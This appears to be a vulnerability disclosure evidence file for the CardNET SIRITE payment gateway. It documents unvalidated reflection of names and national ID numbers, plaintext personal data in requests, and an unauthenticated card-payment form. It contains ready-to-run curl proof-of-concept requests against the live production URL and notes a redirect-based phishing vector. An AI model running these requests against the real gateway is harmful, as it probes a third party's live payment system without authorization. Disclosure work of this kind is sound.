# PII Evidence — CardNET SIRITE Payment Gateway
## NSI-SA-2026-006 | 15 Julio 2026

---

## Evidence 1: Complete PII Reflection

The SIRITE gateway reflects **ANY name + ID number** sent in the POST, with no validation or database verification.

### PoC 1 — Cédula + Name Reflection

```bash
curl -sk -X POST "https://ecommerce.cardnet.com.do/sirite/pasarela-pago/transaccion" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "codigoCentroRecaudacion=0020&codigoServicio=0252&montoServicio=100.00&urlRetorno=https://denuncias.policia.gob.do/OfficialComplaint/Payment&nombre=Maria%20Gomez%20Rodriguez&numeroDocumento=40212345678&tipoDocumento=CEDULA&medioPago=PagoEnLinea&idAutorizacionPortal=TESTCEDA2&numeroAutorizacion="
```

**Response (HTML extraction):**

```
<strong> Maria Gomez Rodriguez </strong>         ← Full name
<strong> 40212345678 </strong>                   ← Cédula (ID)
<strong> Policía Nacional </strong>              ← Institution
<strong> 100.00 </strong>                        ← Amount
```

### PoC 2 — RNC (Business) Format

```bash
curl -sk -X POST "https://ecommerce.cardnet.com.do/sirite/pasarela-pago/transaccion" \
  -d "...&nombre=Comercio%20Prueba%20SRL&numeroDocumento=131456789&tipoDocumento=RNC..."
```

**Response:** RNC number and business name reflected identically.

## Evidence 2: No Server-Side Validation

| Parameter | Value Attempted | Gateway Response |
|-----------|----------------|-----------------|
| nombre | `Maria Gomez Rodriguez` | ✅ Reflected unchanged |
| nombre | `Juan Perez Martinez` | ✅ Reflected unchanged |
| nombre | (empty) | ❌ "Configuración Errónea" |
| numeroDocumento | `40212345678` | ✅ Reflected unchanged |
| numeroDocumento | `00123456789` | ✅ Reflected unchanged |
| numeroDocumento | (empty) | ❌ "Configuración Errónea" |
| tipoDocumento | `CEDULA` | ✅ Accepted |
| tipoDocumento | `RNC` | ✅ Accepted |

**All 13 cédula variants tested returned same response size (9081 bytes)**, confirming the gateway does NOT validate PII against any real database — it simply echoes the input into the payment form HTML.

## Evidence 3: Plaintext PII in HTTP Request

The entire request body contains PII in plaintext:

```http
POST /sirite/pasarela-pago/transaccion HTTP/1.1
Content-Type: application/x-www-form-urlencoded

codigoCentroRecaudacion=0020&
codigoServicio=0252&
montoServicio=100.00&
nombre=Maria%20Gomez%20Rodriguez&    ← PII
numeroDocumento=40212345678&          ← PII
tipoDocumento=CEDULA
```

**Readable by:** Imperva WAF logs, Apache access logs, any TLS-terminating proxy, intermediary systems.

## Evidence 4: Full Credit Card Form Unauthenticated

Same request returns 9,006-byte payment form with card fields:

```html
<form action="/sirite/pasarela-pago/procesa-pago" method="post">
  <input type="text" name="inputNumTarjeta" />  <!-- Card number -->
  <input type="text" name="inputCvc" />           <!-- CVV -->
  <input type="hidden" name="sessionTracking" />
  <input type="hidden" name="gcaptcharesponse" />
  <input type="hidden" name="H-CSRFTOKEN" />
  <button type="submit">Realizar Pago</button>
</form>
```

## Impact Summary

| Impact | Detail |
|--------|--------|
| PII Exposure | Full name + national ID number transmitted in plaintext |
| No Auth | Anyone can initiate a payment session |
| No Input Validation | Any name/ID combination accepted |
| Phishing Vector | Credit card form + URL redirect to attacker-controlled site |
| Log Exposure | PII visible in WAF (Imperva), Apache, and intermediary logs |
